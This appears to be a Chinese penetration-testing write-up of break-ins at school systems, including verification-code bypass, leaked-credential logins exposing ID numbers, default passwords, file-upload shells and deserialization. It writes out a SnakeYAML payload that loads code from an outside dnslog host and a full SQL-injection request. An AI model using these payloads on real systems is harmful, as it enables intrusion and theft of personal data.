+<p>输入手机号，点击获取验证码并抓包</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000004SAkz644cTqZ.jpg">
+    </a></p>
+<p>记录回包内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;datas&#34;:&#34;{\&#34;sign\&#34;:\&#34;407ec6dc275f4766a4525e059a60ca16\&#34;}&#34;,&#34;code&#34;:&#34;0&#34;,&#34;message&#34;:&#34;获取成功&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>随意输入验证码，点击下一步，并把上面的流量包直接返回</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000036Tw9g2SwHrN.jpg">
+    </a></p>
+<p>可以看到页面跳转到了设置密码</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002qBQVv280Zys.jpg">
+    </a></p>
+<p>成功更改密码</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000004MaD4s3SEehL.jpg">
+    </a></p>
+<p>79个应用，通过其中一个aspx站SQL注入拿到shell</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000Il8nU0YXpp6.jpg">
+    </a></p>
+<h2 id="3github泄漏账号密码" class="headerLink">
+    <a href="#3github%e6%b3%84%e6%bc%8f%e8%b4%a6%e5%8f%b7%e5%af%86%e7%a0%81" class="header-mark"></a>3、Github泄漏账号密码</h2><h2 id="账号密码" class="headerLink">
+    <a href="#%e8%b4%a6%e5%8f%b7%e5%af%86%e7%a0%81" class="header-mark"></a>账号密码</h2><p>1、GitHub搜索&quot;学校域名&quot; &ldquo;password&rdquo; 发现邮箱账号密码</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000028qZ261GBxSD.jpg">
+    </a></p>
+<p>2、登录邮箱发现手机号身份证号</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000004IPhjL4HaRYU.jpg">
+    </a></p>
+<h2 id="统一门户" class="headerLink">
+    <a href="#%e7%bb%9f%e4%b8%80%e9%97%a8%e6%88%b7" class="header-mark"></a>统一门户</h2><p>3、手机号加邮箱密码直接登录统一门户</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002IQlBP0HEQQ0.jpg">
+    </a></p>
+<h2 id="泛微oa" class="headerLink">
+    <a href="#%e6%b3%9b%e5%be%aeoa" class="header-mark"></a>泛微OA</h2><p>跳转到泛微OA,文件上传GetShell</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000015WYsF4TidLV.jpg">
+    </a></p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002lu4Iv22rN6f.jpg">
+    </a></p>
+<h2 id="4向日葵密码读取" class="headerLink">
+    <a href="#4%e5%90%91%e6%97%a5%e8%91%b5%e5%af%86%e7%a0%81%e8%af%bb%e5%8f%96" class="header-mark"></a>4、向日葵密码读取</h2><h2 id="heapdump文件泄漏" class="headerLink">
+    <a href="#heapdump%e6%96%87%e4%bb%b6%e6%b3%84%e6%bc%8f" class="header-mark"></a>heapdump文件泄漏</h2><p>直接下载heapdump文件</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000003DAVUR1MVw7T.jpg">
+    </a></p>
+<p>读取到mssql账号密码</p>
+<h2 id="向日葵密码读取" class="headerLink">
+    <a href="#%e5%90%91%e6%97%a5%e8%91%b5%e5%af%86%e7%a0%81%e8%af%bb%e5%8f%96" class="header-mark"></a>向日葵密码读取</h2><p>成功连接mssql服务器，执行xp_cmdshell</p>
+<p>C:\Program Files\Oray\SunLogin\SunloginClient\config.ini为向日葵的默认安装配置文件，直接尝试读取</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000003nO9MS1dJvce.jpg">
+    </a></p>
+<p>fastcode将第一位字母去除就为本机识别码，encry_pwd为加密后的本机验证码</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000003xoA9N0IitE0.jpg">
+    </a></p>
+<p>可以使用GitHub解密项目<a href="https://github.com/wafinfo/Sunflower_get_Password" target="_blank" rel="noopener noreferrer">https://github.com/wafinfo/Sunflower_get_Password</a>进行解密。</p>
+<p>解密后成功连接目标主机服务器</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001NJHmP2vnNhT.jpg">
+    </a></p>
+<h2 id="5若依漏洞getshell" class="headerLink">
+    <a href="#5%e8%8b%a5%e4%be%9d%e6%bc%8f%e6%b4%9egetshell" class="header-mark"></a>5、若依漏洞GetShell</h2><p>1、某学院首页</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000023O62e4dYbMM.jpg">
+    </a></p>
+<p>2、/login ，访问后台页面，发现为若依框架，admin/admin@123直接登录后台</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001Adur14Z0S9S.jpg">
+    </a></p>
+<h2 id="定时任务命令执行" class="headerLink">
+    <a href="#%e5%ae%9a%e6%97%b6%e4%bb%bb%e5%8a%a1%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="header-mark"></a>定时任务命令执行</h2><p>以管理员权限登录在定时任务处新增</p>
+<p>org.yaml.snakeyaml.Yaml.load(&rsquo;!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&ldquo;<a href="ftp://ceshi.bdtmos.dnslog.cn" target="_blank" rel="noopener noreferrer">ftp://ceshi.bdtmos.dnslog.cn</a>&rdquo;] ]] ]&rsquo;)运行任务</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002O5gli4IeWxQ.jpg">
+    </a>DNSlog平台收到请求</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000018P2RS2wcRef.jpg">
+    </a></p>
+<h2 id="shiro-反序列化漏洞" class="headerLink">
+    <a href="#shiro-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e" class="header-mark"></a>shiro 反序列化漏洞</h2><p>工具直接开扫，成功注入内存马</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002goB4z3YtaWR.jpg">
+    </a></p>
+<p>连接内存马</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001ddE362VqH63.jpg">
+    </a></p>
+<p>发现历史入侵痕迹，发现fscan黑客漏扫工具</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000003uA4fi1y61dq.jpg">
+    </a></p>
+<h2 id="sql注入" class="headerLink">
+    <a href="#sql%e6%b3%a8%e5%85%a5" class="header-mark"></a>SQL注入</h2><p>sql注入当时也懒得去尝试，估计也是存在的</p>
+<p>/system/role/list</p>
+<p>/system/role/export</p>
+<p>/system/dept/edit</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /system/role/list HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=e9f143b9-3c3d-4acb-96a4-93c7367a98e9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 75 params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="6fckeditor上传文件getshell" class="headerLink">
+    <a href="#6fckeditor%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6getshell" class="header-mark"></a>6、FCKeditor上传文件GetShell</h2><p>1、扫描目录发现存在FCKeditor目录</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000004dDeHx49WZ0y.jpg">
+    </a></p>
+<p>2、直接找到上传目录</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002PwF8S0QtjaR.jpg">
+    </a></p>
+<p>3、上传aspx木马</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000hB3tL2n5U5E.jpg">
+    </a></p>
+<p>成功连接</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002D40TA24JM2h.jpg">
+    </a></p>
+<h2 id="7任意文件上传" class="headerLink">
+    <a href="#7%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="header-mark"></a>7、任意文件上传</h2><p>根据学校名称及域名进行编排密码本，爆破登录admin账号</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000004Vq9mj0WK2ZP.jpg">
+    </a></p>
+<p>上传点任意文件上传GetShell</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg, https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg 2x"
+            sizes="auto"
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001hSb4k0Ws3Px.jpg">
+    </a></p>
+<h2 id="8s2反序列化漏洞getshell" class="headerLink">
+    <a href="#8s2%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9egetshell" class="header-mark"></a>8、S2反序列化漏洞GetShell</h2><p>1、目标网站存在S2框架</p>
